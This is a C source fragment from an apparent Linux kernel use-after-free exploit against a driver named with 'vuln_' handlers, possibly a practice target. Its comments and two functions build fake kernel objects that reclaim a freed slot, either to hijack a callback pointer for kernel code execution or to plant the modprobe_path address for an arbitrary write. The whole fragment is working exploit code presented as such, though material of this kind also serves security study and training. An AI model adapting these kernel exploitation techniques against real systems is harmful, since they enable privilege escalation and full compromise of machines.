/* ------------------------------------------------------------------ */
/* Build fake vuln_obj for reclaim                                     */
/* ------------------------------------------------------------------ */

/*
 * When we reclaim the freed vuln_obj slot with a controlled allocation,
 * we place a fake vuln_obj with:
 *   - id:       matches the freed object's id so VULN_USE finds it
 *   - callback: points to a kernel gadget
 *
 * If the driver's VULN_USE handler does something like:
 *   obj->callback(obj->data, obj->size);
 * then we get kernel code execution at callback.
 *
 * For the modprobe_path approach, we instead use the UAF to get an
 * arbitrary write primitive:
 *   1. First UAF: reclaim with fake obj where data[] contains the
 *      address of modprobe_path.
 *   2. Use VULN_EDIT to write our path string through the dangling
 *      pointer, which now points to modprobe_path.
 *
 * This requires the driver's VULN_EDIT to write to obj->data based
 * on the (now-reclaimed) object's fields.
 */

static void build_fake_obj_arbwrite(struct vuln_obj *fake, uint32_t target_id,
                                     unsigned long write_target) {
    memset(fake, 0, sizeof(*fake));
    fake->id       = target_id;
    fake->size     = 64;
    fake->callback = NULL;
    /* Store the target address in data[] — the driver's EDIT handler
     * copies user data into obj->data, but if we've reclaimed the object
     * and the driver still holds a pointer to the old slot, the EDIT
     * will write to our controlled object's data area.
     *
     * For the arbwrite variant, we need a second UAF or a different
     * technique. Below we use the simpler callback-overwrite approach.
     */
    memcpy(fake->data, &write_target, sizeof(write_target));
}

static void build_fake_obj_callback(struct vuln_obj *fake, uint32_t target_id,
                                     unsigned long callback_addr) {
    memset(fake, 0, sizeof(*fake));
    fake->id       = target_id;
    fake->size     = 48;
    fake->callback = (void *)callback_addr;
    /* data[] can contain arguments to the callback if needed */
}

